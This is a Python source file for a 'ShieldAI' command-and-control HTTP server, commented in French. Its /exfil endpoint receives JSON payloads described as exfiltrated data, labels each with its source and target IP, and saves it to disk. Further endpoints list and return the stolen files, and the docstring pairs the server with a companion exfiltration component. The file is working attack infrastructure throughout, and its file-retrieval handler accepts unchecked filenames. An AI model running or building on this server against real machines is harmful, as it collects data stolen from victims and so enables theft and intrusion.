#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun May 24 2026

@author: hounsousamuel

Serveur C2 HTTP — reçoit les données exfiltrées et les sauvegarde sur disque.
Lancer avant ExfiltrationHTTP :
    python c2_server.py
    python c2_server.py --host 0.0.0.0 --port 8888 --output ./c2_data
"""

import json
import argparse
import asyncio
from datetime import datetime
from pathlib import Path
from aiohttp import web


# =============================================================================
# CONFIG
# =============================================================================

DEFAULT_HOST   = "127.0.0.1"
DEFAULT_PORT   = 8888
DEFAULT_OUTPUT = Path("./c2_data")


# =============================================================================
# HANDLERS
# =============================================================================

async def handle_exfil(request: web.Request) -> web.Response:
    """Reçoit un payload JSON et le sauvegarde sur disque."""
    output_dir: Path = request.app["output_dir"]

    try:
        payload = await request.json()
    except Exception:
        return web.Response(status=400, text="Invalid JSON")

    # Nom de fichier unique : source__target__timestamp.json
    source    = payload.get("source", "unknown").replace("/", "_")
    target_ip = payload.get("target_ip", "unknown").replace(".", "-")
    ts        = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename  = f"{source}__{target_ip}__{ts}.json"

    output_path = output_dir / filename
    output_path.write_text(
        json.dumps(payload, indent=2, ensure_ascii=False),
        encoding="utf-8"
    )

    print(
        f"[{datetime.now().strftime('%H:%M:%S')}] "
        f"📥 Reçu [{source}] depuis {target_ip} → {filename}"
    )

    return web.Response(status=200, text="OK")


async def handle_list(request: web.Request) -> web.Response:
    """Liste tous les fichiers reçus."""
    output_dir: Path = request.app["output_dir"]
    files = sorted(output_dir.glob("*.json"))
    result = [
        {"file": f.name, "size": f.stat().st_size}
        for f in files
    ]
    return web.json_response(result)


async def handle_get(request: web.Request) -> web.Response:
    """Récupère le contenu d'un fichier spécifique."""
    output_dir: Path = request.app["output_dir"]
    filename = request.match_info.get("filename", "")
    path = output_dir / filename

    if not path.exists() or not path.is_file():
        return web.Response(status=404, text="File not found")

    return web.Response(
        text=path.read_text(encoding="utf-8"),
        content_type="application/json"
    )


async def handle_health(request: web.Request) -> web.Response:
    """Health check."""
    output_dir: Path = request.app["output_dir"]
    files = list(output_dir.glob("*.json"))
    return web.json_response({
        "status": "ok",
        "received": len(files),
        "output_dir": str(output_dir),
    })


# =============================================================================
# APP
# =============================================================================

def build_app(output_dir: Path) -> web.Application:
    output_dir.mkdir(parents=True, exist_ok=True)

    app = web.Application()
    app["output_dir"] = output_dir

    app.router.add_post("/exfil",              handle_exfil)
    app.router.add_get("/list",                handle_list)
    app.router.add_get("/get/{filename}",      handle_get)
    app.router.add_get("/health",              handle_health)

    return app


# =============================================================================
# MAIN
# =============================================================================

def run_c2(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT, output_dir: Path | str = DEFAULT_OUTPUT):
    app = build_app(output_dir)

    print(f"""
╔══════════════════════════════════════════╗
║         ShieldAI C2 Server               ║
╠══════════════════════════════════════════╣
║  Host   : {host:<31}║
║  Port   : {port:<31}║
║  Output : {str(output_dir):<31}║
╚══════════════════════════════════════════╝
""")

    web.run_app(app, host=host, port=port, print=None)
    
def main():
    parser = argparse.ArgumentParser(description="ShieldAI C2 Server")
    parser.add_argument("--host",   default=DEFAULT_HOST,         help="Host (default: 127.0.0.1)")
    parser.add_argument("--port",   default=DEFAULT_PORT,  type=int, help="Port (default: 8888)")
    parser.add_argument("--output", default=DEFAULT_OUTPUT, type=Path, help="Dossier de sauvegarde")
    args = parser.parse_args()
    
    run_c2(
        host=args.host,
        port=args.port,
        output_dir=args.output
    )


if __name__ == "__main__":
    main()